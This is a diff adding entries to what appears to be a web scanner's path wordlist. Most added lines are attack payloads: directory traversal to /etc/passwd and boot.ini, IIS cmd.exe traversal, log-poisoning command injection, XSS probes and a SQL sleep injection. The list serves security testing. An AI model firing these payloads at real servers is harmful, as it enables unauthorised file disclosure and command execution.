+include/security.inc.php?cmd=".urlencode($command)."&l=".urlencode("../../../members/uploads/".$subdir."/".$filename.chr(0x00))
 include/sendit.php3
 include/sendit2.php3
 include/setting.php
@@ -128228,6 +128033,7 @@ includes.ru.po
 includes.xml
 includes/
 includes/$action/login.php
+includes/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
 includes/Admin/Menus/Submissions.php
 includes/Cache/Lite/Function.php
 includes/Cache/Lite/Output.php
@@ -128926,6 +128732,7 @@ index.brail
 index.cfm
 index.cgi
 index.cgi?page=../../../../../../../../etc/passwd
+index.cgi?page=../../../../../../../../etc/passwd%00
 index.class.php
 index.cqs
 index.css
@@ -129045,6 +128852,7 @@ index.php.svn-base
 index.php.svn-work
 index.php/
 index.php/%22%3C/a%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+index.php/../../../../../../../../../etc/passwd
 index.php/123
 index.php/2012/02/foswiki-xss-vulrble/
 index.php/About/6.html
@@ -129252,6 +129060,7 @@ index.php?SqlQuery=test%20
 index.php?WE_LANGUAGE=../../../../../../../../etc/passwd%00
 index.php?a=../../../../../etc/passwd%00
 index.php?act=../../../../../../etc/passwd%00
+index.php?act=module&module=gallery&cmd=viewimage&img=&file_type=&dir=../../../../../../etc/passwd
 index.php?action=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00&expid=..%2f..%2f..%2f.%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00&ajax_action=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00&printerfriendly=..%2f..%2f..%2f..%2f..%2f..%2f.%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00&section=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00&module=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00&controller=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2..%2f..%2f..%2f..%2f..%2fboot.ini%00
 index.php?action=../../../../boot.ini%00
 index.php?action=../../../autoexec.bat%00&kategorie=Tutorial
@@ -129276,7 +129085,11 @@ index.php?cat=10_Willkommen&page=../../../../../BOOTSECT.BAK%00
 index.php?catid=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;
 index.php?chemin=..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc
 index.php?class=../../../tmp/file%00
+index.php?cmd=
+index.php?cmd=&lng=../../../../../../../../../etc/passwd%00
+index.php?cmd=&post=../../../../../../../../../etc/passwd
 index.php?cmd=../../../../../../../../windows/system.ini%00
+index.php?cmd=ls%20-la&xoopsOption[nocommon]=1&xoopsConfig[theme_set]=../../../../../../../../../../var/log/httpd/error_log%00
 index.php?content=../../../../../../../../../../../../../../etc/passwd%00
 index.php?conteudo=../../../../etc/passwd
 index.php?controller=pjBackup&action=pjActionDownload&id=../../../../../../../../etc/passwd
@@ -129301,10 +129114,13 @@ index.php?id=../../../../../../../etc/passwd%00
 index.php?id=../../../../../etc/passwd%00 
 index.php?id=../../../../etc/passwd%00
 index.php?inc=../../../autoexec.bat%00
+index.php?include_files[]=&include_files[1]=/var/log/httpd/access_log
+index.php?ind=../../../../../../../../../../../../etc/passwd%00
 index.php?l=../../../etc/passwd
 index.php?l=forum/view.php&topic=../../../../../../../../../etc/passwd
 index.php?l=forum/view.php&topic=../../../etc/passwd
 index.php?lang=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00
+index.php?lang=../../../../../../../../../../../../etc/passwd%00
 index.php?lang=../../../../../../../../etc/passwd%00
 index.php?lang=/../../../../autoexec.bat%00&page_id=106
 index.php?lang=DSecRG&language_full=../../../../../../../../../../../../../boot.ini%00
@@ -129348,6 +129164,9 @@ index.php?name=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527
 index.php?newlang=../../../../../../../../../../etc/passwd%00
 index.php?newlang=../../../../../../BOOTSECT.BAK%00
 index.php?newtheme=../../../../../../../../../../etc/passwd%00
+index.php?node=system&op=../../../cache/ext/statman/log.gtdat%00
+index.php?node=system&op=blockop&block=3&bop=../../../../cache/ext/statman/log.gtdat%00
+index.php?node=system&op=extop&ext=statman&eop=../../../../cache/ext/statman/log.gtdat%00
 index.php?obj_id=/../../../../../../../../../../proc/self/environ%00
 index.php?offset=[%20Problem%20Here%20]
 index.php?option=com_abbrev&controller=../../../../../../../../../../etc/passwd%00
@@ -129532,6 +129351,7 @@ index.php?page= ../../../../../../../../etc/passwd%00.htm
 index.php?page= ../../../../../../../../etc/passwd%00.html
 index.php?page= ../../../../../../../../etc/passwd%00.jpg
 index.php?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+index.php?page=../../../../../../../../../";
 index.php?page=../../../../../../../../../../../../../../.. /../../../../../../../../../etc/passwd%00
 index.php?page=../../../../../../../../../../../../../../../../../../../../etc/passwd
 index.php?page=../../../../../../../../../../../../../../../etc/passwd%00
@@ -129554,6 +129374,7 @@ index.php?page=/../../../../autoexec.bat%00
 index.php?page=info&action=../../../../../../../../../../../../etc/passwd%00
 index.php?page=licenses
 index.php?page=login&request=forgot_password&include=../../../../../../../../etc/passwd
+index.php?page=main
 index.php?page=users/../../../../boot.ini
 index.php?page=users/login.php&update=update/../../../../boot.ini
 index.php?page=weblog&env=../../../autoexec.bat%00
@@ -129570,19 +129391,24 @@ index.php?routestring=ajax/render/widget_php
 index.php?s=../../../../../../../etc/passwd%00
 index.php?search_string=%27%3E%3Cscript%3Ealert(%27PoC%20CVE-2018-19828%27)%3C%2Fscript%3E
 index.php?selskin=..%2F..%2F..%2F..%2F.%2Fetc%2Fpasswd%00
+index.php?sensor_program=lmsensors.inc.php/../../README%00
+index.php?setLang=suntzu&lang[suntzu][file]=../../../../../../../../../../../var/log/httpd/access_log
 index.php?show=../../../../../../etc/passwd%00
 index.php?showforum=1&prune_day=100&sort_by=Z-A&sort_key=[sqlgoeshere]
 index.php?site=../../../../../../../etc/passwd%00
 index.php?site=admin&action=sites 
 index.php?site=demos&bn=../../../../../../../../../../etc/passwd%00
 index.php?skin=../../../../autoexec.bat%00
+index.php?sl=../../../../../../../etc/passwd%00
 index.php?sql_debug=1
 index.php?stream=text&mod=/../../../../../../../../../../../etc/passwd%00
 index.php?tampon=test%20
 index.php?template=../../../../../../../../../../../../../etc/passwd%00
 index.php?template=../../../../../../../../../../boot.ini%00
+index.php?template=../../../../../../../etc/passwd%00
 index.php?template=../../../../etc/passwd
 index.php?theme=../../../../../../../../../../../../../../../etc/passwd%00
+index.php?theme=../../../../../../../../../../../etc/passwd%00
 index.php?theme=../../../../../etc/passwd%00
 index.php?top_message=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
 index.php?topic=&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;%20
@@ -130785,8 +130611,11 @@ infusions/download_management/infusion.php
 infusions/e_cart
 infusions/e_cart/items.php
 infusions/freshlinks_panel/index.php
+infusions/fusion_forum_view/fusion_forum_view.php?settings[locale]=../../../../config.php
 infusions/last_seen_users_panel/last_seen_users_pa
 infusions/last_seen_users_panel/last_seen_users_panel.php
+infusions/last_seen_users_panel/last_seen_users_panel.php?cmd=ls%20-la&settings[locale]=../../../../images/avatars/suntzu[1].jpg%00
+infusions/last_seen_users_panel/last_seen_users_panel.php?settings[locale]=../../../../../../../../../etc/passw%00
 infusions/manuals/manuals.php
 infusions/mg_user_fotoalbum_panel/mg_user_fotoalbum.php
 infusions/raidtracker_panel/thisraidprogress.php
@@ -131372,6 +131201,8 @@ install/update.log
 install/upgrade.php
 install03_cgi.php
 install05.php
+install05.php?blog_language=../../../../../../etc/passwd%00
+install05.php?blog_language=../../../../../../var/log/httpd/access_log%00&cmd=ls%20-la
 install1
 install1.php
 install1/
@@ -133062,6 +132893,7 @@ izap_rss_news.php
 izard
 izh
 izhevsk
+iziContents//include/rssfunctions.php?GLOBALS[modules_home]=../../../../../../etc/passwd
 izle
 izle.asp
 izle.php
@@ -135449,6 +135281,7 @@ kg3~!igbdjhrw
 kg_callffmpeg.php
 kgb
 kgb-coming-soon
+kgbmod/sesskglogadmin.php?sesloga=1&skinnn=../../kg/wpisy.txt%00
 kgv
 kh
 khabar
@@ -135739,6 +135572,7 @@ knowledge-center
 knowledge.asp
 knowledge.html
 knowledge_base
+knowledge_base ../../../ file.php
 knowledgebase
 knowledgebase.%EXT%
 knowledgebase.asp
@@ -136154,6 +135988,7 @@ kubeblog/adm/users_add.php
 kubelance/adm/admin_add.php
 kubelance/profile.php
 kubelance/profile.php?id=
+kubix/../../../../../etc/passwd
 kubrick
 kudos
 kudos.htm
@@ -136757,6 +136592,7 @@ lang/leslangues.php
 lang/pafaq.php
 lang2
 lang2po.php
+lang=../../../../../../../../../etc/passwd%00
 lang=/../../../../../../../../boot.ini%00.html&op=start&submit=Next
 langEn
 lang_EN.php
@@ -138793,6 +138629,7 @@ liguria
 lii
 lika
 like
+like this one /www.pluginvulnerabilities.com/2017/07/24/wordpress-plugin-for-use-in-testing-for-php-object-injection/
 like.%EXT%
 like.php
 like_cube
@@ -141510,6 +141347,7 @@ lssom
 lst
 lst.pl
 lstat/lstat.cgi
+lstat/lstat.cgi?obj=wg104&template=../../../../../../../../etc/passwd&from=-1m&to=now
 lstman.aspx
 lstman2.aspx
 lstsetng.aspx
@@ -142356,6 +142194,7 @@ maia/login.php
 maia/login.php?lang=../../../../../../../../../../../../../var/log/httpd-error.log%00.txt
 maian/cart/index.php
 maian/upload/admin/index.php
+maian_gallery/
 maids
 maigmo
 maigrirselongout
@@ -143362,6 +143201,7 @@ manage_user.tpl
 manage_user_page.php
 manage_users.php
 manage_users.tpl
+manage_users.tpl.php
 manageaccount.asp
 manageaccount.aspx
 manageaddr
@@ -144516,6 +144356,8 @@ mb_return.asp
 mba
 mba.html
 mbam
+mbb/?mod=../../../../../../../../../../../../../[file]%00
+mbb/?ref=../../../../../../../../../../../../../[file]%00
 mbcircus.asp
 mbd
 mbdlms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
@@ -145873,6 +145715,7 @@ message.lang.php
 message.php
 message.shtml
 message.tpl
+message.tpl.php
 message.txt
 message.vm
 message/
@@ -146129,6 +145972,7 @@ method
 method.cfm
 method.install.php
 method.tpl
+method.tpl.php
 method.uninstall.php
 method.upgrade.php
 method_item.html.dist
@@ -146745,6 +146589,7 @@ misc.html
 misc.inc.php
 misc.js
 misc.php
+misc.php?cmd=ls%20-la&xoopsOption[nocommon]=1&xoopsConfig[language]=../../../../../../../../../../var/log/httpd/access_log%00
 misc.py
 misc/
 misc/RSS1.php
@@ -148176,13 +148021,21 @@ modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&incl
 modules.tpl
 modules/
 modules/3rdparty/adminpart/add3rdparty.php
+modules/3rdparty/adminpart/add3rdparty.php?module=../../../../../../etc/passwd
 modules/Accounts/index.php
+modules/Accounts/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/Administration/CustomizeFields.php
+modules/Administration/CustomizeFields.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../etc/passwd%00
 modules/Administration/Development.php
+modules/Administration/Development.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../etc/passwd%00
 modules/Administration/DstFix.php
+modules/Administration/DstFix.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../etc/passwd%00
 modules/Administration/RebuildAudit.php
+modules/Administration/RebuildAudit.php?GLOBALS[sugarEntry]=1&beanFiles[1]=../../../../../../../../../../../../../etc/passwd
 modules/Administration/Upgrade.php
+modules/Administration/Upgrade.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../../etc/passwd%00
 modules/Administration/index.php
+modules/Administration/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../etc/passwd%00
 modules/AllMyGuests/signin.php
 modules/AutoTheme/
 modules/AvantGo/language/bad.php
@@ -148195,25 +148048,36 @@ modules/Blocks/pnblocks/text.php
 modules/Blocks/pnblocks/thelang.php
 modules/Blocks/pnblocks/user.php
 modules/Bugs/index.php
+modules/Bugs/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../../etc/passwd%00
 modules/Builder/DownloadModule.php?file=../../../../../../../../etc/passwd%00
 modules/Calendar/admin/update.php
 modules/Calendar/calendar.php
 modules/Calendar/index.php
+modules/Calendar/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../etc/passwd%00
 modules/Calendar/scheme.php
 modules/Calls/index.php
+modules/Calls/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../../../etc/passwd%00
 modules/CampaignLog/Forms.php
+modules/CampaignLog/Forms.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/CampaignTrackers/Forms.php
+modules/CampaignTrackers/Forms.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/Campaigns/Forms.php
+modules/Campaigns/Forms.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/Campaigns/index.php
+modules/Campaigns/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/Cases/index.php
+modules/Cases/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/Contact_Plus/admin/case.php
 modules/Contacts/index.php
+modules/Contacts/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/Dashboard/index.php
+modules/Dashboard/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/DesignManager/action.ajax_get_stylesheets.php
 modules/DesignManager/action.ajax_get_templates.php
 modules/Discipline/CategoryBreakdownTime.php
 modules/Discipline/StudentFieldBreakdown.php
 modules/Documents/index.php
+modules/Documents/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/Documents/version_list.php
 modules/DownloadManager/lib/simple-upload/example.php
 modules/Downloads/language/lang-greek.php
@@ -148221,17 +148085,26 @@ modules/Downloads/language/lang-indonesian.php
 modules/Downloads/voteinclude.php
 modules/Downloads/voteinclude.php+
 modules/Dropdown/Popup.php
+modules/Dropdown/Popup.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/Dropdown/index.php
+modules/Dropdown/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/DynamicFields/Popup.php
+modules/DynamicFields/Popup.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/EN-Forums/db/mysql.php
 modules/EditCustomFields/EditView.php
+modules/EditCustomFields/EditView.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/EditCustomFields/Forms.php
+modules/EditCustomFields/Forms.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/EmailMan/index.php
+modules/EmailMan/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/EmailTemplates/index.php
+modules/EmailTemplates/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/Emails/index.php
+modules/Emails/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/Fancy_NewsLetter/admin/includes/FANCYNLOptions.php
 modules/Feeds/Feed.php
 modules/Feeds/index.php
+modules/Feeds/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/FileManager/dunzip.php
 modules/FileManager/untgz.php
 modules/Forums/admin/admin_avatar.php
@@ -148255,15 +148128,20 @@ modules/Forums/attachment.php
 modules/Forums/bb_smilies.php
 modules/Forums/bb_smilies.php?Default_Theme=<script>alert('Vulnerable')</script>
 modules/Forums/bb_smilies.php?bgcolor1=\"><script>alert('Vulnerable')</script>
+modules/Forums/bb_smilies.php?name=../../../../../../etc/passwd%00
 modules/Forums/bb_smilies.php?name=<script>alert('Vulnerable')</script>
 modules/Forums/bb_smilies.php?site_font=}--></style><script>alert('Vulnerable')</script>
 modules/Home/PopupSugar.php
+modules/Home/PopupSugar.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/Journal/language/lang-portuguese.php
 modules/Journal/search.php
 modules/Leads/index.php
+modules/Leads/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/MailMerge/index.php
+modules/MailMerge/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/MambWeather/Savant2/Savant2_Plugin_options.php
 modules/Meetings/index.php
+modules/Meetings/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/Messages/readpmsg.php
 modules/Module/index.php
 modules/Module/index.php?module=../../../../autoexec.bat%00
@@ -148276,18 +148154,26 @@ modules/Mysqlfinder/MysqlfinderAdmin.php
 modules/NS-Multisites/installation/config.php
 modules/News/index.php
 modules/Notes/index.php
+modules/Notes/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/NukeAI/util.php
 modules/Opportunities/index.php
+modules/Opportunities/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/OptimisticLock/LockResolve.php
+modules/OptimisticLock/LockResolve.php?GLOBALS[sugarEntry]=1&_SESSION[o_lock_object]=1&_SESSION[o_lock_module]=1&beanList[1]=1&beanFiles[1]=../../../../../../../../etc/passwd
 modules/PNphpBB2/printview.php
 modules/PNphpBB2/printview.php?phpEx=/../../../../../../../etc/passwd
 modules/Partenaires/clic.php
 modules/Printing/output.php
 modules/Project/Forms.php
+modules/Project/Forms.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/Project/index.php
+modules/Project/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/ProjectTask/index.php
+modules/ProjectTask/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/ProspectLists/index.php
+modules/ProspectLists/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/Prospects/index.php
+modules/Prospects/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/README.txt
 modules/RSS/pnincludes/scripts/magpie_debug.php
 modules/RSS/pnincludes/scripts/magpie_simple.php
@@ -148298,6 +148184,7 @@ modules/Reviews/admin/case.php
 modules/Reviews/language/lang-norwegian.php
 modules/Reviews/language/lang-portuguese.php
 modules/Roles/index.php
+modules/Roles/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/Search/index.php
 modules/Settings/Vtiger/actions/CompanyDetailsSave.php
 modules/Showtime2/moduleinfo.ini
@@ -148307,6 +148194,7 @@ modules/Submit/index.php
 modules/Submit/index.php?op=pre&title=<script>alert(document.cookie);</script>
 modules/Surveys/language/lang-indonesian.php
 modules/Tasks/index.php
+modules/Tasks/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/Tasks/vardefs.php
 modules/Themes/index.php
 modules/Themes/index.php?module=../../../../autoexec.bat%00
@@ -148315,7 +148203,9 @@ modules/Themes/index.php?ss_module=../../../../autoexec.bat%00
 modules/TinyMCE/content_css.php
 modules/Top/index.php
 modules/Users/Login.php
+modules/Users/Login.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/Users/index.php
+modules/Users/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
 modules/WebChat/in.php
 modules/WebChat/in.php+
 modules/WebChat/out.php
@@ -148378,6 +148268,7 @@ modules/article/fullarticle.inc.php
 modules/article2/comments.inc.php
 modules/article2/fullarticle.inc.php
 modules/article2/overview.inc.php
+modules/articles/adminpart/addarticles.php?module=../../../../etc/passwd
 modules/articles/article.php
 modules/articles/index.php
 modules/articles/print.php
@@ -148430,6 +148321,7 @@ modules/book/book.js
 modules/book/book.module
 modules/book/book.pages.inc
 modules/book/book.test
+modules/brandnews/adminpart/addbrandnews.php?module=../../../etc/passwd
 modules/brandnews/adminpart/img_upload.php
 modules/budget.php
 modules/calendar/calendar.php
@@ -148440,6 +148332,7 @@ modules/catalog/upload_photo.php
 modules/categories_path.php
 modules/cermi/actions/upload_fileuploadcontrol.php
 modules/certinfo/index.php?module=../../../../../../etc/passwd%00
+modules/chat/dac.php?sendChatData=/../../../system/cache/logs/
 modules/city.get/city.get.php
 modules/city.get/index.php
 modules/cjaycontent/admin/editor2/spaw_control.class.php
@@ -148448,6 +148341,7 @@ modules/classifieds/index.php
 modules/cluster-paradise/cluster-E.php
 modules/cms/index.php
 modules/code/syntax_check.php
+modules/code/syntax_check.php?rm=..%2f..%2f..%2f..%2f..%2f..%2f' + file + '%00 HTTP/1.1\r\n'
 modules/color/color-rtl.css
 modules/color/color.css
 modules/color/color.info
@@ -148479,6 +148373,7 @@ modules/common/logs
 modules/config/admin_utente.php
 modules/config/languages.php
 modules/config/post.php
+modules/contact/adminpart/addcontact.php?module=../../../../etc/passwd
 modules/contact/contact.admin.inc
 modules/contact/contact.info
 modules/contact/contact.install
@@ -148677,6 +148572,7 @@ modules/gallery/gallery_summary.php
 modules/gallery/helpers/gallery.php
 modules/gallery/resize.php
 modules/gallery/view_img.php
+modules/game/adminpart/addgame.php?module=../../../../etc/passwd
 modules/gamification/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 modules/getdata.php
 modules/global/inc/content.inc.php
@@ -148860,7 +148756,13 @@ modules/newbb/viewforum.php
 modules/newbb/viewtopic.php
 modules/newbb_plus/admin/forum_config.php
 modules/newbb_plus/class/class.forumposts.php
+modules/newbb_plus/class/class.forumposts.php?bbPath[path]=../../../../../../../../etc/passwd%00
+modules/newbb_plus/class/class.forumposts.php?cmd=ls%20-la&bbPath[path]=../../../../../../test.php%00
+modules/newbb_plus/class/class.forumposts.php?cmd=ls%20-la&bbPath[path]=[how far from runcms root?]../../../UserFiles/File/shell.inc%00
 modules/newbb_plus/class/forumpollrenderer.php
+modules/newbb_plus/class/forumpollrenderer.php?bbPath[path]=../../../../../../../../etc/passwd%00
+modules/newbb_plus/class/forumpollrenderer.php?cmd=ls%20-la&bbPath[path]=../../../../../../test.php%00
+modules/newbb_plus/class/forumpollrenderer.php?cmd=ls%20-la&bbPath[path]=[how far from runcms root?]../../../UserFiles/File/shell.inc%00
 modules/newbb_plus/config.php
 modules/newbb_plus/votepolls.php
 modules/news/archive.php
@@ -148881,6 +148783,7 @@ modules/news/submit.php
 modules/news/submit.php HTTP/1.0
 modules/news/topics.php
 modules/newsdesk/newsdesk_article_require.php
+modules/newsletter/adminpart/addnewsletter.php?module=../../../../etc/passwd
 modules/newsletter/insert_image.php
 modules/node/content_types.inc
 modules/node/content_types.js
@@ -148963,6 +148866,7 @@ modules/php/php.install
 modules/php/php.module
 modules/php/php.test
 modules/phplib/include.php
+modules/plain/adminpart/addplain.php?module=../../../../../etc/passwd
 modules/pms/index.php
 modules/poll/inlinepoll.php
 modules/poll/poll-bar--block.tpl.php
@@ -148981,11 +148885,13 @@ modules/poll/poll.test
 modules/poll/poll.tokens.inc
 modules/poll/poll_summary.php
 modules/poll/showpoll.php
+modules/polling/adminpart/addpolling.php?module=../../../../../etc/passwd
 modules/popnupblog/class/sendmail.php
 modules/popnupblog/index.php
 modules/prayerlist/index.php
 modules/presence/index.php?module=../../../../../../etc/passwd%00
 modules/pro/inc/ajax.php
+modules/product/adminpart/addproduct.php?module=../../../../etc/passwd
 modules/profile/profile-block.tpl.php
 modules/profile/profile-listing.tpl.php
 modules/profile/profile-wrapper.tpl.php
@@ -149366,6 +149272,7 @@ modules/toolbar/toolbar.png
 modules/toolbar/toolbar.tpl.php
 modules/toprated/toprated.php
 modules/tour/adminpart/addtour.php
+modules/tour/adminpart/addtour.php?module=../../../etc/passwd
 modules/tracker/tracker.css
 modules/tracker/tracker.info
 modules/tracker/tracker.install
@@ -150449,7 +150356,10 @@ msa
 msaccess.php
 msadc
 msadc/
+msadc/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
+msadc/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
 msadc/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir
+msadc/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
 msadc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir+c:%5c
 msadc/..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir
 msadc/Samples/SELECTOR/showcode.asp
@@ -151090,6 +151000,7 @@ mxd.asp
 mxkart
 mxml.php
 my
+my $post = "action=Load&archives=../../../../../../../../../etc/passwd%00
 my project
 my view.aspx
 my-account
@@ -151352,6 +151263,7 @@ myaccount.html
 myaccount.jsp
 myaccount.php
 myaccount.tpl
+myaccount.tpl.php
 myaccount/
 myaccount/failure.asp
 myaccount/viewProfile.asp
@@ -152720,6 +152632,8 @@ nclb
 nclexcat
 ncm
 ncmain.php
+ncms/
+ncms/index.php?cmd=&newlang=../../../../../../../../../../../../etc/passwd%00'
 ncom
 ncommerce3
 ncommerce3/ExecMacro/macro.d2w/%0a%0a
@@ -155312,6 +155226,7 @@ notify.class.php
 notify.htm
 notify.html
 notify.php
+notify.php?v=a/ ../../../../../../../../etc/passwd
 notify.txt
 notify/
 notify_url.aspx
@@ -155817,6 +155732,7 @@ nuclear
 nucleo
 nucleus
 nucleus/libs/PLUGINADMIN.php
+nucleus/libs/PLUGINADMIN.php?GLOBALS[DIR_LIBS]=/var/log/httpd/access_log%00&cmd=ls%20-la
 nucleus/nucleus/plugins/skinfiles/index.php?DIR_LIBS=../../../var/log/httpd/access_log%00
 nucleus/plugins/NP_Twitter.php
 nucleus/plugins/NP_gallery.php
@@ -157777,6 +157693,7 @@ opencart/index.php
 opencart1521/admin/index.php
 opencart1521/index.php
 openclassifieds/
+openclassifieds/?location=%26%23039;/**/or/**/sleep(10)/**/or/**/1=%26%23039;
 opencms
 opencms/opencms/system/workplace/admin/workplace/logfileview/
 opencms/opencms/system/workplace/admin/workplace/logfileview/downloadTrigger.jsp
@@ -159668,6 +159585,7 @@ oval
 ovation
 ovc
 ove
+ovecms/?load=../../../../../../../../../../etc/passwd%00
 oven
 over
 over-ons
@@ -160565,6 +160483,7 @@ page.php
 page.php,
 page.php?id=
 page.php?id=../../../../../../BOOTSECT.BAK
+page.php?page=../../../../../etc/passwd%00
 page.php?pid=n
 page.php?xPage=../../../../../../../../../../../../../etc/passwd%00
 page.php?xPage=../../../../../../../../../../etc/httpd/logs/error_log%00&cmd=ls+-lisa
@@ -160574,6 +160493,7 @@ page.restrictor.log
 page.restrictor.php
 page.tpl
 page.tpl.inc
+page.tpl.php
 page.xml
 page/
 page/1
@@ -160984,6 +160904,7 @@ pages/poll.php
 pages/poll.php?skin=../../../../../autoexec.bat%00
 pages/print/default/ops/news.php
 pages/print/default/ops/news.php?id=1&lang=../../../../../../../../../boot.ini%00
+pages/print/default/ops/news.php?id=1&lang=../../../../../etc/passwd%00
 pages/product_details.php                  
 pages/products/aguestbook/download.php
 pages/showblog.php
@@ -164375,6 +164296,7 @@ phpGedView/editconfig_gedcom.php
 phpGedView/editconfig_gedcom.php?gedcom_config=../../../../../../etc/passwd
 phpGedView/index/[GED_File]_conf.php
 phpGradeBook/admin/index.php
+phpGroupWare/calendar/inc/class.holidaycalc.inc.php?GLOBALS[phpgw_info][user][preferences][common][country]=../../../../../../../../../etc/passwd%00
 phpInfo.php
 phpInputFilter
 phpInputFilter/class.inputfilter.php
@@ -164483,6 +164405,7 @@ phpMyAdmin-2.6.3/
 phpMyAdmin-2.6.4
 phpMyAdmin-2.6.4-pl1
 phpMyAdmin-2.6.4-pl1/
+phpMyAdmin-2.6.4-pl1/ ../../../../../etc/passwd
 phpMyAdmin-2.6.4-pl2
 phpMyAdmin-2.6.4-pl2/
 phpMyAdmin-2.6.4-pl3
@@ -164614,6 +164537,7 @@ phpMyAdminhf/
 phpMyAdminold/
